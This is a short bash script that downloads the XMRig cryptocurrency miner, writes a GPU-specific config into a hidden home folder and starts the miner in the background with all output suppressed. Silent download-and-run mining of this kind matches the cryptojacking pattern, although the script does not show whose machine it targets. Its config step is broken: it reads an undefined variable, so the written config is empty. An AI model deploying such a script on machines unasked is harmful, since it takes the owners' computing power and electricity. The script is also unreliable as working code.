#!/bin/bash

# Variables
XMRIG_URL="https://github.com/xmrig/xmrig/releases/latest/download/xmrig"
CONFIG_PATH="$HOME/.xmrig/config.json"
LOG_FILE="$HOME/.xmrig/installation.log"
RETRY_COUNT=0

# Functions
log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> "$LOG_FILE"
}

download_xmrig() {
    while [ $RETRY_COUNT -lt 10 ]; do
        curl -o "$HOME/xmrig" -L "$XMRIG_URL" && chmod +x "$HOME/xmrig"
        if [ $? -eq 0 ]; then
            log "XMRig downloaded successfully."
            return
        fi
        log "Download failed. Retrying ($((RETRY_COUNT+1))/10)..."
        RETRY_COUNT=$((RETRY_COUNT+1))
        sleep 5
    done
    log "Failed to download XMRig after 10 attempts."
    exit 1
}

configure_xmrig() {
    WORKER_NAME="worker-$(shuf -i 1000-9999 -n 1)"
    GPU=$(lspci | grep -E "NVIDIA|AMD")
    CONFIG='
    '"$config"'
    '
    if [[ "$GPU" == *"NVIDIA"* ]]; then
        CONFIG=$(echo "$CONFIG" | sed 's/"cuda": {[^}]*}/"cuda": { "enabled": true }/')
    elif [[ "$GPU" == *"AMD"* ]]; then
        CONFIG=$(echo "$CONFIG" | sed 's/"opencl": {[^}]*}/"opencl": { "enabled": true }/')
    fi
    CONFIG=$(echo "$CONFIG" | sed "s/minipck/$WORKER_NAME/")
    mkdir -p "$(dirname "$CONFIG_PATH")"
    echo "$CONFIG" > "$CONFIG_PATH"
    log "Configuration updated: WorkerName = $WORKER_NAME, GPU = $GPU"
}

# Main Logic
log "Starting XMRig installation..."
download_xmrig
[ ! -f "$CONFIG_PATH" ] && configure_xmrig
nohup "$HOME/xmrig" --config="$CONFIG_PATH" &>/dev/null &
log "XMRig setup complete and running in the background."
